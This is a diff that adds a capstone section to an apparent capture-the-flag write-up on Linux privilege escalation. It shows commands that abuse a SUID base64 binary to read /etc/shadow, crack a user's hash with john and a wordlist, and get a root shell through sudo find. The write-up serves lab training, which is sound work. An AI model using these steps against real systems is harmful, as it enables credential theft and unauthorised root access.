@@ -316,3 +316,40 @@ We will have our root shell.
 
 ## Capstone Project
 
+Task 1: What is the content of flag1.txt
+
+Task 2: What is the content of flag2.txt
+
+First we need to enumerate the system.
+
+We find that this is a CentOS 7 server with 3.10.0 linux kernel and we couldn't find any easy to exploit kernel vulnerability. Let's read /etc/passwd file. 
+
+```bash
+$cat /etc/passwd | grep home
+```
+We found 1 other user. So try to read the shadow file with ```$sudo cat /etc/shadow``` This user can't run sudo command, so we can't see the shadow file. So, let's try to find any luck with SGID or SUID. 
+
+```bash
+$find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+We have base64 with suid bit set to it so let's read the shadow file using base64
+
+```bash
+$base64 /etc/shadow | base64 -d | grep missy | cut -d ":" -f 2,3 > missy.hash
+```
+Now break the hash using john. with ```$john missy.hash --wordlist=/usr/share/wordlists/rockyou.txt``` and voila we got the password
+
+Login as missy ```su - missy``` 
+
+Try to find any flag that is present in under missy's access level
+
+```bash
+$find / -name flag*.txt 2>/dev/null
+```
+
+We got a hit. Now we can read flag1.txt. Now list sudo permission for missy. ```$sudo -l``` we have got that missy can run find with sudo and doesn't require any password. So, let's break into root using find as we have got earlier 
+
+```bash
+$sudo find . -exec /bin/bash \; -quit
+```
